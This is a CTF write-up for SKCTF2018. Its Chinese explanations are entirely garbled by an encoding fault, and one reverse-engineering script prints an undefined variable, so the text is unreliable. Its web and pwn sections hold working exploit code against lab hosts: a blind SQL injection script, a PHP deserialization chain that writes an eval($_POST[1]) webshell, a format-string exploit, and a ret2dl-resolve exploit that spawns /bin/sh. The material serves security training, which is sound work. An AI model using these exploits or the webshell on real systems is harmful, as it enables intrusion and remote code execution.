<p>é‡è¦ä»£ç å°±åˆ°è¿™ç»“æŸäº†ï¼Œä»”ç»†è¯»ä¸€ä¸‹ä¹Ÿä¸éš¾ï¼Œforeachæ˜¯ä¸€ä¸ªå¾ªç¯ï¼ŒåŒæ ·æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼preg_matchï¼Œè¿™æ®µä»£ç çš„æ„æ€æ˜¯ï¼Œä½ è¦ä½¿å¾—dataä¸­çš„æ•°æ®åŒ¹é…åˆ°è¶…è¿‡ä¸‰æ¬¡ï¼Œnumæ‰èƒ½ä¸&lt;3ï¼Œä¹Ÿå°±æ˜¯è¦å‡ºç°è¶…è¿‡ä¸‰ç§ä»¥ä¸Šçš„æ•°æ®ï¼Œå› ä¸ºä»£ç é‡Œè§„å®šçš„æ•°æ®åªæœ‰ä¸‰ç§ï¼Œä¹Ÿå°±æ˜¯å­—æ¯ï¼Œæ•°å­—ï¼Œæ ‡ç‚¹ç¬¦å·ï¼Œæ‰€ä»¥ä¹Ÿå°±æ˜¯è¦è¿™ä¸‰ç§æ•°æ®éƒ½å‡ºç°åœ¨payloadä¸­æ‰èƒ½æ»¡è¶³æ¡ä»¶ï¼Œé‚£æœ‰çš„åŒå­¦ä¼šé—®äº†ï¼Œè¿™ä¸ªæ¡ä»¶å’Œä¹‹å‰é‚£ä¸ªæ­£åˆ™è¡¨è¾¾å¼æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Œä¹‹å‰é‚£ä¸ªè¦æ±‚å‡ºç°å…«æ¬¡ä»¥ä¸Šï¼Œä½†æ˜¯å¹¶ä¸è¦æ±‚ä¸‰ç§æ•°æ®éƒ½å‡ºç°ï¼Œè¿™é‡Œè¦æ±‚çš„æ˜¯ä¸‰ç§éƒ½å‡ºç°ï¼Œè€Œä¸”è¦æ±‚æ•°å­—ç­‰äº187667123ï¼Œä¸‹ä¸€ä¸ªæ¡ä»¶æ˜¯ï¼š</p>
<pre><code>if (!is_numeric($da))
            &#123;
                if(27500 &lt; $da)</code></pre>
<p>getä¸€ä¸ªnumå‚æ•°ï¼Œis_numericå‡½æ•°æ˜¯åˆ¤æ–­ä¸€ä¸ªå‚æ•°æ˜¯ä¸æ˜¯æ•°å­—ï¼Œè€Œä¸”è¿˜è¦æ±‚æ¯”27500å¤§ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯åˆ¤æ–­ä¸€ä¸ªå‚æ•°æ˜¯ä¸æ˜¯æ•°å­—ï¼Œé‚£ä¹ˆå¦‚æœç©¿è¿›å»çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å°±ä¼šè¿”å›0ï¼Œç»•è¿‡ï¼Œç„¶åè¦æ±‚æ¯”27500å¤§ï¼Œè¿™å°±æ˜¯phpçš„å¼±ç±»å‹ï¼Œå¦‚æœä½ ä¼ è¾“çš„å‚æ•°ä¸º27501aï¼Œé‚£ä¹ˆå¼ºåˆ¶è½¬æ¢åæ¯”è¾ƒçš„æ•°å­—å°±æ˜¯27501ï¼Œæ¯”27500å¤§ï¼Œä¹Ÿç»•è¿‡ï¼Œç„¶åå¾—åˆ°flagï¼Œæœ€ç»ˆpayloadä¸ºï¼š</p>
<pre><code>url=http://127.0.0.1/other.php?num=27501a
POST=data=187667123.0e+0-0+0</code></pre>
<p>ç­”æ¡ˆå¤šæ ·åŒ–ï¼Œå¤§å®¶éšæ„å‘æŒ¥ã€‚</p>
<h2 id="login-me-easy-edition"><a href="#login-me-easy-edition" class="headerlink" title="login me[easy edition]"></a>login me[easy edition]</h2><p>è¿™é¢˜è€ƒå¯Ÿsql boolç›²æ³¨ï¼Œå‡ ä¹æ²¡æœ‰wafã€‚</p>
<p>payloadï¼š<code>username=admin&#39; and substr((select f14g from f1ag),1,1)=&#39;S&#39;#&amp;password=123</code></p>
<p>æ¥ä¸‹æ¥å°±å¯ä»¥ç›´æ¥ç›²æ³¨æŸ¥è¡¨äº†ã€‚</p>
<pre><code class="python">#-*-coding:utf-8-*-

import requests 
import time

url = &#39;http://192.168.211.131:49157/&#39; 

def check(payload):
    postdata=&#123;&#39;username&#39;:payload,&#39;password&#39;:&#39;admin&#39;&#125;
    r = requests.post(url,postdata).content
    #print r
    return &#39;Wrong password&#39; in r

flag=&#39;&#39;
s = r&#39;SKCTF&#123;&#125;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@_&#39;
for i in xrange(1,64):    
    for c in s:        
        payload = &#39;admin\&#39; and substr((select f14g from f1ag),%s,1)=\&#39;%s\&#39;#&#39;%(str(i),c)     
        #print payload
        if check(payload):
            flag += c
            break
    print flag
    if &#39;&#125;&#39; in flag:
        break        </code></pre>
<p>sqlmap -r ä¹Ÿèƒ½è·‘å‡ºæ¥</p>
<h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy web"></a>easy web</h2><h3 id="hint"><a href="#hint" class="headerlink" title="hint"></a>hint</h3><ul>
<li>æºä»£ç æ³„éœ²</li>
<li>å–„äºä½¿ç”¨æœç´¢å¼•æ“</li>
</ul>
<h3 id="è§£æ"><a href="#è§£æ" class="headerlink" title="è§£æ"></a>è§£æ</h3><p>ç”±æºä»£ç æ³„éœ²å¯ä»¥çŸ¥é“æœ‰ä¸‰ä¸ªæ–‡ä»¶<br>index.php</p>
<pre><code>&lt;?php

ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);
session_start();
echo rand();
if(isset($_POST[&#39;up_addr&#39;]))
&#123;
    include(&quot;rand_addr.php&quot;);
    if($_POST[&#39;up_addr&#39;]===$up_addr&amp;&amp;isset($_POST[&#39;str&#39;]))
    &#123;
        $str = $_POST[&#39;str&#39;];
        $_SESSION[&#39;name&#39;] = $str;
    &#125;

&#125;
</code></pre>
<p>kkkk.php</p>
<pre><code>&lt;?php

ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
session_start();
class  SKCTF&#123;
    var $content;
    function __destruct() &#123;
        include(&quot;rand_addr.php&quot;);
        file_put_contents(&quot;/var/www/html/upload/$up_addr.php&quot;,$this-&gt;content);
    &#125;
&#125;
</code></pre>
<p>rand_addr.php</p>
<pre><code>&lt;?php
$up_addr = str_shuffle(&#39;0123456789abcdefghijklmnopqrstuvwxyz&#39;);</code></pre>
<p>ä»£ç é€»è¾‘å¾ˆç®€å•ï¼Œæ˜æ˜¾é¢„æµ‹éšæœºå­—ç¬¦ä¸²ï¼Œé¢„æµ‹å‡ºæ¥åˆ¤æ–­æ­£ç¡®ä¹‹åæœ‰ä¸ªå­˜å‚¨sessionçš„æ“ä½œï¼Œç„¶åå¯ä»¥å‘ç°ä¸¤ä¸ªæ–‡ä»¶å¯¹sessionçš„æ“ä½œæ–¹å¼ä¸ä¸€æ ·ï¼Œå¯¼è‡´äº†sessionååºåˆ—åŒ–çš„äº§ç”Ÿã€‚</p>
<p>åˆ†æ<code>str_shuffle</code>å‡½æ•°çš„åº•å±‚ä»£ç </p>
<pre><code>static void php_string_shuffle(char *str, long len TSRMLS_DC) /* &#123;&#123;&#123; */
&#123;
    long n_elems, rnd_idx, n_left;
    char temp;
    /* The implementation is stolen from array_data_shuffle       */
    /* Thus the characteristics of the randomization are the same */
    n_elems = len;

    if (n_elems &lt;= 1) &#123;
        return;
    &#125;

    n_left = n_elems;

    while (--n_left) &#123;
        rnd_idx = php_rand(TSRMLS_C);
        RAND_RANGE(rnd_idx, 0, n_left, PHP_RAND_MAX);
        if (rnd_idx != n_left) &#123;
            temp = str[n_left];
            str[n_left] = str[rnd_idx];
            str[rnd_idx] = temp;
        &#125;
    &#125;
&#125;</code></pre>
<p>å¯ä»¥çŸ¥é“<code>str_shuffle</code>æ˜¯é€šè¿‡è·å–randå€¼æ¥æ‰“ä¹±å­—ç¬¦ä¸²çš„ï¼Œæ ¹æ®ä¼ è¿›æ¥çš„å­—ç¬¦ä¸²å€¼çš„é•¿åº¦å†³å®šäº†è°ƒç”¨è·å–randçš„æ¬¡æ•°ï¼Œé‚£ä¹ˆå‚è€ƒæ–‡ç« </p>
<pre><code>http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/</code></pre>
<p>å¯ä»¥çŸ¥é“rand()å€¼æ˜¯å¯ä»¥é¢„æµ‹çš„ï¼Œçœ‹ä¸€ä¸‹RAND_RANGEçš„å®ç°</p>
<pre><code>#define RAND_RANGE(__n, __min, __max, __tmax) \
(__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))</code></pre>
<p>é‚£ä¹ˆæ—¢ç„¶randå¯ä»¥é¢„æµ‹çš„è¯ï¼Œæ‰“ä¹±åçš„å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥é¢„æµ‹ã€‚</p>
<p>å‡å¦‚è¿™é‡Œé¢„æµ‹äº†å­—ç¬¦ä¸²è¿˜è€ƒå¯Ÿäº†sessionååºåˆ—åŒ–<br>æ„é€ ååºåˆ—åŒ–çš„payload</p>
<pre><code>&lt;?php

class  SKCTF&#123;
    var $content;
&#125;
$p0desta = new SKCTF();
$p0desta-&gt;content = &quot;&lt;?php eval(\$_POST[1]); ?&gt;&quot;;
echo &quot;|&quot;.serialize($p0desta);</code></pre>
<p>é‡å†™str_shuffleçš„åº•å±‚ä»£ç ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„åˆ°åº•ä»€ä¹ˆæ—¶å€™ä¼ å…¥å¤šå°‘ä¸ªrand()å€¼ï¼Œpocå¦‚ä¸‹</p>
<pre><code>#encoding: utf-8
import requests
import re
import random
from ctypes import *

def RAND_RANGE(__n,__min,__max,__tmax):
    xx =  __min + ( ( (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))
    return (int)(xx)

def str_shuffle(arr,ss):
    n_elems = len(ss)
    if(n_elems&lt;=1):
        return
    num = -1
    kk = []
    brr = []
    for m in range(32,32+n_elems+1):
        num = num+1
        arr.append((arr[m-3]+arr[m-31])%2147483647)
        brr.append(arr[num])

    n_left = n_elems
    n = -1
    n_left = n_left-1
    sss = []
    for s in ss:
        sss.append(s)
    x = 0
    while (n_left):

        n = n+1
        rnd_idx = brr[n]
        rnd_idx = RAND_RANGE(rnd_idx,0,n_left,2147483647)

        if(rnd_idx!=n_left):
            sss[rnd_idx],sss[n_left] = sss[n_left],sss[rnd_idx]
        n_left = n_left-1
        x = x + 1
    return sss

ars = []
headers=&#123;
        &#39;Connection&#39;: &#39;Keep-Alive&#39;
&#125;
s = requests.Session()
url=&#39;http://192.168.190.128:1112/index.php&#39;
for i in range(32):
    r =s.get(url=url,headers=headers)
    ars.append(int(r.text))
#print ars
payload = []
for i in range(73):
    ars.append((ars[i+1]+ars[i+29])%2147483647)
sss = str_shuffle(ars[33:65],&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;)
key = &#39;&#39;.join(sss)
print &quot;key:&quot;+key
sss1 = str_shuffle(ars[68:],&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;)
key1 = &#39;&#39;.join(sss1)
print &quot;key1:&quot;+key1
data = &#123;
    &quot;up_addr&quot;:key,
    &quot;str&quot;:&#39;|O:5:&quot;SKCTF&quot;:1:&#123;s:7:&quot;content&quot;;s:25:&quot;&lt;?php eval($_POST[1]); ?&gt;&quot;;&#125;&#39;
&#125;
print data
r=s.post(url,headers=headers,data=data)
print(r.text)
url_new = &quot;http://192.168.190.128:1112/kkkk.php&quot;
print s.get(url=url_new).content
</code></pre>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>ç®€å•çš„å¤§æ•°å­—æ ¼å¼åŒ–å­—ç¬¦ä¸²</p>
<pre><code class="python"># coding=utf-8
from pwn import *

p = process(&#39;./pwn1&#39;)

payload = fmtstr_payload(7, &#123;0x0804a028: 0x12345678&#125;)

p.sendline(payload)

p.interactive()</code></pre>
<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œå¾ˆç›´è§‚çš„æ¼æ´åœ¨readå‡½æ•°ï¼Œä½†æ˜¯åªæœ‰ä¸€ä¸ªreadï¼Œæ²¡æœ‰å¯ä»¥ç”¨æ¥leakçš„å‡½æ•°ï¼Œæ‰€ä»¥ç”¨Return-to-dl-resolveçš„è§£æ³•   </p>
<ol>
<li>é¦–å…ˆåœ¨bssæ®µå†™å…¥/bin/sh   </li>
<li>è°ƒç”¨systemå‡½æ•°</li>
</ol>
<pre><code class="python">#coding:utf-8
import sys
import roputils
from pwn import *


p = process(&#39;./pwn2&#39;)
elf = ELF(&#39;pwn2&#39;)

readplt = elf.plt[&#39;read&#39;]
#print hex(readplt)


#readplt = 0x8048310
bss = 0x0804A024 
vulFun = 0x0804844D
offset = 40

rop = roputils.ROP(&#39;./pwn2&#39;)
bss_addr = rop.section(&#39;.bss&#39;)

buf1 = &#39;A&#39; * offset
buf1 += p32(readplt) + p32(vulFun) + p32(0) + p32(bss_addr) + p32(100)

p.send(buf1)

buf2 =  rop.string(&#39;/bin/sh&#39;)
buf2 += rop.fill(20, buf2)
buf2 += rop.dl_resolve_data(bss_addr+20, &#39;system&#39;)
buf2 += rop.fill(100, buf2)
p.send(buf2)

buf3 = &#39;A&#39;* offset + rop.dl_resolve_call(bss_addr+20, bss_addr)
p.send(buf3)
p.interactive()</code></pre>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="BabyRE"><a href="#BabyRE" class="headerlink" title="BabyRE"></a>BabyRE</h2><p>ä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•åˆ†æ</p>
<pre><code>gdb-peda$ b main.main
Breakpoint 1 at 0x48ea30: file /root/Desktop/babyre.go, line 7.
gdb-peda$ disas main.main
Dump of assembler code for function main.main:
   0x000000000048ea30 &lt;+0&gt;: mov    rcx,QWORD PTR fs:0xfffffffffffffff8
   0x000000000048ea39 &lt;+9&gt;: lea    rax,[rsp-0x8]
   0x000000000048ea3e &lt;+14&gt;:    cmp    rax,QWORD PTR [rcx+0x10]
   0x000000000048ea42 &lt;+18&gt;:    jbe    0x48ebda &lt;main.main+426&gt;
   0x000000000048ea48 &lt;+24&gt;:    sub    rsp,0x88
   0x000000000048ea4f &lt;+31&gt;:    mov    QWORD PTR [rsp+0x80],rbp
   0x000000000048ea57 &lt;+39&gt;:    lea    rbp,[rsp+0x80]
   0x000000000048ea5f &lt;+47&gt;:    lea    rax,[rip+0x1087a]        # 0x49f2e0
   0x000000000048ea66 &lt;+54&gt;:    mov    QWORD PTR [rsp],rax
   0x000000000048ea6a &lt;+58&gt;:    call   0x40e470 &lt;runtime.newobject&gt;
   0x000000000048ea6f &lt;+63&gt;:    mov    rax,QWORD PTR [rsp+0x8]
   0x000000000048ea74 &lt;+68&gt;:    mov    QWORD PTR [rsp+0x48],rax
   0x000000000048ea79 &lt;+73&gt;:    mov    ecx,0x1
   0x000000000048ea7e &lt;+78&gt;:    jmp    0x48eb09 &lt;main.main+217&gt;
   0x000000000048ea83 &lt;+83&gt;:    inc    rcx
   0x000000000048ea86 &lt;+86&gt;:    cmp    rcx,0xf
   0x000000000048ea8a &lt;+90&gt;:    jge    0x48ebb9 &lt;main.main+393&gt;
   0x000000000048ea90 &lt;+96&gt;:    mov    rdx,QWORD PTR [rax+0x8]
   0x000000000048ea94 &lt;+100&gt;:   mov    rbx,QWORD PTR [rax]
   0x000000000048ea97 &lt;+103&gt;:   cmp    rcx,rdx
   0x000000000048ea9a &lt;+106&gt;:   jae    0x48ebd3 &lt;main.main+419&gt;
   0x000000000048eaa0 &lt;+112&gt;:   movzx  edx,BYTE PTR [rbx+rcx*1]
   0x000000000048eaa4 &lt;+116&gt;:   lea    rbx,[rip+0x324b8]        # 0x4c0f63
   0x000000000048eaab &lt;+123&gt;:   movzx  esi,BYTE PTR [rbx+rcx*1]
   0x000000000048eaaf &lt;+127&gt;:   xor    edx,esi
   0x000000000048eab1 &lt;+129&gt;:   cmp    dl,0x3
   0x000000000048eab4 &lt;+132&gt;:   jne    0x48eb6f &lt;main.main+319&gt;
   0x000000000048eaba &lt;+138&gt;:   cmp    rcx,0xe
   0x000000000048eabe &lt;+142&gt;:   jne    0x48ea83 &lt;main.main+83&gt;
   0x000000000048eac0 &lt;+144&gt;:   xorps  xmm0,xmm0
   0x000000000048eac3 &lt;+147&gt;:   movups XMMWORD PTR [rsp+0x50],xmm0
   0x000000000048eac8 &lt;+152&gt;:   lea    rax,[rip+0x10811]        # 0x49f2e0
   0x000000000048eacf &lt;+159&gt;:   mov    QWORD PTR [rsp+0x50],rax
   0x000000000048ead4 &lt;+164&gt;:   lea    rcx,[rip+0x42df5]        # 0x4d18d0 &lt;main.statictmp_1&gt;
   0x000000000048eadb &lt;+171&gt;:   mov    QWORD PTR [rsp+0x58],rcx
   0x000000000048eae0 &lt;+176&gt;:   lea    rdx,[rsp+0x50]
   0x000000000048eae5 &lt;+181&gt;:   mov    QWORD PTR [rsp],rdx
   0x000000000048eae9 &lt;+185&gt;:   mov    QWORD PTR [rsp+0x8],0x1
   0x000000000048eaf2 &lt;+194&gt;:   mov    QWORD PTR [rsp+0x10],0x1
   0x000000000048eafb &lt;+203&gt;:   call   0x4831a0 &lt;fmt.Println&gt;
   0x000000000048eb00 &lt;+208&gt;:   xor    eax,eax
   0x000000000048eb02 &lt;+210&gt;:   mov    ecx,eax
   0x000000000048eb04 &lt;+212&gt;:   mov    rax,QWORD PTR [rsp+0x48]
   0x000000000048eb09 &lt;+217&gt;:   test   cl,cl
   0x000000000048eb0b &lt;+219&gt;:   je     0x48ebc3 &lt;main.main+403&gt;
   0x000000000048eb11 &lt;+225&gt;:   mov    BYTE PTR [rsp+0x47],cl
   0x000000000048eb15 &lt;+229&gt;:   xorps  xmm0,xmm0
   0x000000000048eb18 &lt;+232&gt;:   movups XMMWORD PTR [rsp+0x70],xmm0
   0x000000000048eb1d &lt;+237&gt;:   lea    rcx,[rip+0xda1c]        # 0x49c540
   0x000000000048eb24 &lt;+244&gt;:   mov    QWORD PTR [rsp+0x70],rcx
   0x000000000048eb29 &lt;+249&gt;:   mov    QWORD PTR [rsp+0x78],rax
   0x000000000048eb2e &lt;+254&gt;:   lea    rdx,[rip+0x30dc8]        # 0x4bf8fd
   0x000000000048eb35 &lt;+261&gt;:   mov    QWORD PTR [rsp],rdx
   0x000000000048eb39 &lt;+265&gt;:   mov    QWORD PTR [rsp+0x8],0x2
   0x000000000048eb42 &lt;+274&gt;:   lea    rbx,[rsp+0x70]
   0x000000000048eb47 &lt;+279&gt;:   mov    QWORD PTR [rsp+0x10],rbx
   0x000000000048eb4c &lt;+284&gt;:   mov    QWORD PTR [rsp+0x18],0x1
   0x000000000048eb55 &lt;+293&gt;:   mov    QWORD PTR [rsp+0x20],0x1
   0x000000000048eb5e &lt;+302&gt;:   call   0x489180 &lt;fmt.Scanf&gt;
   0x000000000048eb63 &lt;+307&gt;:   mov    rax,QWORD PTR [rsp+0x48]
   0x000000000048eb68 &lt;+312&gt;:   xor    ecx,ecx
   0x000000000048eb6a &lt;+314&gt;:   jmp    0x48ea86 &lt;main.main+86&gt;
   0x000000000048eb6f &lt;+319&gt;:   xorps  xmm0,xmm0
   0x000000000048eb72 &lt;+322&gt;:   movups XMMWORD PTR [rsp+0x60],xmm0
   0x000000000048eb77 &lt;+327&gt;:   lea    rax,[rip+0x10762]        # 0x49f2e0
   0x000000000048eb7e &lt;+334&gt;:   mov    QWORD PTR [rsp+0x60],rax
   0x000000000048eb83 &lt;+339&gt;:   lea    rcx,[rip+0x42d36]        # 0x4d18c0 &lt;main.statictmp_0&gt;
   0x000000000048eb8a &lt;+346&gt;:   mov    QWORD PTR [rsp+0x68],rcx
   0x000000000048eb8f &lt;+351&gt;:   lea    rdx,[rsp+0x60]
   0x000000000048eb94 &lt;+356&gt;:   mov    QWORD PTR [rsp],rdx
   0x000000000048eb98 &lt;+360&gt;:   mov    QWORD PTR [rsp+0x8],0x1
   0x000000000048eba1 &lt;+369&gt;:   mov    QWORD PTR [rsp+0x10],0x1
   0x000000000048ebaa &lt;+378&gt;:   call   0x4831a0 &lt;fmt.Println&gt;
   0x000000000048ebaf &lt;+383&gt;:   movzx  eax,BYTE PTR [rsp+0x47]
   0x000000000048ebb4 &lt;+388&gt;:   jmp    0x48eb02 &lt;main.main+210&gt;
   0x000000000048ebb9 &lt;+393&gt;:   movzx  eax,BYTE PTR [rsp+0x47]
   0x000000000048ebbe &lt;+398&gt;:   jmp    0x48eb02 &lt;main.main+210&gt;
   0x000000000048ebc3 &lt;+403&gt;:   mov    rbp,QWORD PTR [rsp+0x80]
   0x000000000048ebcb &lt;+411&gt;:   add    rsp,0x88
   0x000000000048ebd2 &lt;+418&gt;:   ret    
   0x000000000048ebd3 &lt;+419&gt;:   call   0x424f70 &lt;runtime.panicindex&gt;
   0x000000000048ebd8 &lt;+424&gt;:   ud2    
   0x000000000048ebda &lt;+426&gt;:   call   0x44d270 &lt;runtime.morestack_noctxt&gt;
   0x000000000048ebdf &lt;+431&gt;:   jmp    0x48ea30 &lt;main.main&gt;
End of assembler dump.

</code></pre>
<p>73è¡Œä¸€å±‚whileå¾ªç¯, ç„¶åè·³åˆ°217è¡Œ, è‹¥ç¬¦åˆwhileæ¡ä»¶, å‘ä¸‹æ‰§è¡Œåˆ°302è¡Œè°ƒç”¨Scanfå‡½æ•°ï¼Œç„¶åå†è·³å›86è¡Œ, è¿›å…¥ä¸€ä¸ªi = 0; i &lt; 15çš„å¾ªç¯, åœ¨116è¡ŒåŠ è½½ä¸€ä¸ªå­—ç¬¦ä¸²[0x4c0f63]<code>PH@WExabazd3qf~</code>(ä½¿ç”¨ x /s 0x4c0f63æŸ¥çœ‹), ç„¶åè¿›è¡Œé€ä½å¼‚æˆ–, è‹¥å¼‚æˆ–ç»“<br>æœä¸ä¸º1, åˆ™è·³å‡ºå¾ªç¯Printf(â€œWrongâ€), å¦åˆ™ç»§ç»­å¾ªç¯, ç›´åˆ°å¾ªç¯ç»“æŸè¾“å‡ºPrintf(â€œRightâ€)</p>
<p>æºç :</p>
<pre><code class="golang">package main

import (
&quot;fmt&quot;
)

func main() &#123;
    var i = true
    str := &quot;&quot;
    str2 := &quot;PH@WExabazd3qf~&quot;
    for i &#123;
        fmt.Scanf(&quot;%s&quot;, &amp;str)
        for b:=0; b &lt; 15; b++ &#123;
            if str[b] ^ str2[b] != 3 &#123;
                fmt.Println(&quot;Wrong&quot;)
                break
            &#125; else &#123;
                if b == 14 &#123;
                    fmt.Println(&quot;Right&quot;)
                    i = !true
                    break
                &#125;
            &#125;
        &#125;
    &#125;
&#125;</code></pre>
<h2 id="intel"><a href="#intel" class="headerlink" title="intel"></a>intel</h2><p>è™½ç„¶æ˜¯macç¨‹åºï¼Œä½†æ˜¯idaä¹Ÿèƒ½åˆ†æ<br>ç›´æ¥ä¸Šè„šæœ¬</p>
<pre><code>def calc(result):
    for i in range(32,128):
        k = i
        for j in range(4):
            tmp = k*2
            if tmp &amp; 0x100:
                tmp |= 1
            k = tmp &amp; 255
        if k == result:
            return chr(i)
string=&#39;44F6F557F5C696B656F51425D4F596E63747275736479603E6F3A392&#39;.decode(&#39;hex&#39;)
flag = &#39;&#39;
for ch in string:
    flag+=calc(ord(ch))

print f_d</code></pre>
<h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2><p>ä¸€ä¸ªexeæ–‡ä»¶ï¼ŒæŸ¥å£³<br><img src="http://oymyxu3ku.bkt.clouddn.com/TIM%E5%9B%BE%E7%89%8720180510184251.png" alt="image"><br>ç”¨IDAæ‰“å¼€ï¼ŒF12æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œå‘ç°å‡ ä¸ªå…³é”®å¥<br><img src="http://oymyxu3ku.bkt.clouddn.com/TIM%E6%88%AA%E5%9B%BE20180510184507.jpg" alt="image"><br>åŒå‡»è¿›å…¥åˆ°å…·ä½“ä½ç½®<br><img src="http://oymyxu3ku.bkt.clouddn.com/TIM%E6%88%AA%E5%9B%BE20180510184601.jpg" alt="image"><br>åœ¨å‡½æ•°åä¸ŠæŒ‰Xï¼Œå¯»æ‰¾åˆ°å‡½æ•°çš„å…·ä½“ä½ç½®ï¼ŒF5æŸ¥çœ‹ä¼ªä»£ç <br><img src="http://oymyxu3ku.bkt.clouddn.com/TIM%E6%88%AA%E5%9B%BE20180510184601.jpg" alt="image"><br>åˆ†æä¸€ä¸‹è¯­å¢ƒï¼Œå‘ç°ä¸â€œU7kD0VwFt2d0DUUfVxdQEMl=ZVd=â€è¿™ä¸²å­—ç¬¦ä¸²æœ‰å…³ï¼Œæ—¢ç„¶å’Œflagæ¥è¿‘ï¼Œé‚£å°±æ˜¯è¯¥å­—ç¬¦ä¸²ç»è¿‡æŸäº›è½¬æ¢æ‰èƒ½å¾—åˆ°flag<br>è§‚å¯Ÿè¯¥å­—ç¬¦ä¸²ï¼ŒçŒœæµ‹ä¸å¯†ç æœ‰å…³ï¼Œçœ‹åˆ°ä¸¤ä¸ªç­‰å·è”æƒ³åˆ°base64ï¼Œä½†æ˜¯æ ¼å¼åˆä¸åƒï¼ŒçŒœæµ‹æ …æ å¯†ç ï¼Œè§£å¯†å¾—åˆ°flagã€‚</p>
<p>-&gt; æ …æ å¯†ç </p>
<p><code>U0tDVEZ7V2UxMVkwdUdldDF0fQ==</code></p>
<p>-&gt;base64 decode</p>
<p><code>SKCTF&#123;We11Y0uGet1t&#125;</code></p>
<h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><h2 id="çˆ†ç ´å¤§æ³•å¥½"><a href="#çˆ†ç ´å¤§æ³•å¥½" class="headerlink" title="çˆ†ç ´å¤§æ³•å¥½"></a>çˆ†ç ´å¤§æ³•å¥½</h2><p>è§åçŸ¥æ„ï¼Œæœ¬é¢˜å°±æ˜¯é‡‡ç”¨çˆ†ç ´çš„æ–¹æ³•å¾—åˆ°flag.</p>
<p><img src="/images/SKCTF2018/android1.png" alt="android1"></p>
<p>å…³é”®ä»£ç å¦‚ä¸Šï¼Œå¯ä»¥çœ‹åˆ°ç¨‹åºé¦–å…ˆæŸ¥çœ‹è¾“å…¥çš„å­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯å¦ä¸º6ï¼Œç„¶åå°†è¾“å…¥è¿›è¡ŒMD5åŠ å¯†ï¼Œå°†åŠ å¯†åçš„ç»“æœä¸resultè¿›è¡Œæ¯”è¾ƒã€‚</p>
<p>å› ä¸ºé‡‡ç”¨çš„MD5åŠ å¯†ï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥è§£å¯†ï¼Œé‡‡ç”¨çˆ†ç ´çš„æ–¹æ³•å¾—åˆ°flagã€‚</p>
<p>Flagä¸ºskctf{soeasy}</p>
<h2 id="getFlag"><a href="#getFlag" class="headerlink" title="getFlag"></a>getFlag</h2><p>ç¨‹åºæ‰“å¼€åä¸ºä¸€ä¸ªç½‘é¡µï¼Œç„¶åé€šè¿‡ç‚¹å‡»ç½‘é¡µé“¾æ¥è°ƒç”¨encryptç±»ï¼Œ</p>
<p><img src="/images/SKCTF2018/android2.png" alt="android"></p>
<p>å°†è¾“å…¥æ¯å››ä½è¿›è¡Œå¾ªç¯å·¦ç§»ï¼Œinput[0,1,2,3,4,5,6â€¦]å˜ä¸ºinput[1,2,3,0,5,6,7,4â€¦]</p>
<p><img src="/images/SKCTF2018/android3.png" alt="android"></p>
<p>è·å–ç¨‹åºçš„ç­¾åå€¼ï¼Œè¿™åœ°æ–¹ä¸ºäº†é™ä½éš¾åº¦ï¼Œæ‰“å¼€äº†Logï¼Œä¸çŸ¥é“è¿™æ˜¯è·å–ç­¾åä¹Ÿå¯ä»¥åšï¼ŒæŸ¥çœ‹ä¸€ä¸‹logå³å¯å¾—åˆ°ç­¾åå€¼ã€‚</p>
<p><img src="/images/SKCTF2018/android4.png" alt="android"></p>
<p>å°†ä¸Šé¢å·¦ç§»åçš„ç»“æœä¸ç­¾åçš„å¶æ•°ä½è¿›è¡Œå¼‚æˆ–å¾—åˆ°v5ï¼Œæœ€åå°†v5ä¸resultè¿›è¡Œæ¯”è¾ƒã€‚</p>
<p>åæ¨ä¸€ä¸‹ç®—æ³•è¿‡ç¨‹å³å¯å¾—åˆ°flagã€‚Flagä¸ºskctf{congratulation!!}</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code class="python">end = [13, 92, 5, 87, 81, 22, 65, 22, 89, 70, 94, 8, 91, 67, 64, 90]
s = &quot;B026B34B00BB4CD2862175D157B1AD5EE89A407C&quot;
ss =&quot;b026b34b00bb4cd2862175d157b1ad5ee89a407c&quot;
flag =&quot;&quot;
for i in range(0,16):
    flag += (chr(int(end[i]) ^ ord(ss[i*2])))
print(flag)
flag = list(flag)
for i in range(0,4):
    c = flag[(3-i)*4+3]

    for j in range(0,3):
        flag[(3-i) * 4 + (2-j) + 1] = flag[(3-i) * 4 + (2-j)]
    flag[(3-i) * 4] = c
    print(flag)
for i in range(0,16):
    print(flag[i],end=&quot;&quot;)
#congratulation!!
</code></pre>
